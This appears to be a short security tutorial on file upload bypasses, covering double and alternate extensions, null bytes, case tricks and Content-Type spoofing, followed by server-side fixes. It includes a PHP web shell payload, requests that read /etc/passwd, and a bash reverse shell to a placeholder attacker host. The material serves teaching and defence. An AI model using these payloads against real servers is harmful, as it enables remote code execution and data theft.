File Upload Bypass — How It Works

What the server checks (insufficient)

1. File extension — only checks the last component after the final dot
2. Content-Type header — set by the client, trivially spoofed

Neither check is reliable. Both are fully attacker-controlled.

Bypass techniques

Double extension

filename: shell.php.jpg

Server checks last extension (.jpg) → passes. Web server may still execute .php component depending on config (AddHandler application/x-httpd-php .php applies to any filename containing .php).

Null byte truncation (older PHP / CGI)

filename: shell.php%00.jpg

Extension check sees .jpg. C string functions stop at the null byte → file stored as shell.php.

Alternative PHP extensions

.php5  .php7  .phtml  .phar  .php.   (trailing dot on Windows)

Not in the blocked list but still executed by the PHP interpreter.

Case variation

shell.pHp  shell.PHP  shell.PhP

Bypasses case-sensitive extension blocklists on Linux.

Content-Type spoofing

POST /upload HTTP/1.1
Content-Type: multipart/form-data

Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg    ← attacker sets this freely

<?php system($_GET['cmd']); ?>

Impact after successful upload

# Execute OS commands
GET /uploads/shell.php?cmd=id
→ uid=33(www-data)

# Read sensitive files
GET /uploads/shell.php?cmd=cat+/etc/passwd

# Reverse shell
GET /uploads/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/attacker/4444+0>%261'

The Fix

1. Re-encode / re-process images server-side (PIL/Pillow, sharp)
   — strips any embedded PHP from a "JPEG" and confirms it's a real image

2. Store uploads OUTSIDE the web root
   /var/uploads/  (not /var/www/uploads/)
   Serve via a controller: GET /files/123 → stream from disk

3. Rename files on upload — ignore the original filename entirely
   uuid4() + .jpg  — no attacker-controlled extension

4. Disable PHP execution in the uploads directory
   # Nginx
   location /uploads/ { location ~ \.php$ { deny all; } }

5. Validate magic bytes — not just extension/MIME
   JPEG: FF D8 FF
   PNG:  89 50 4E 47
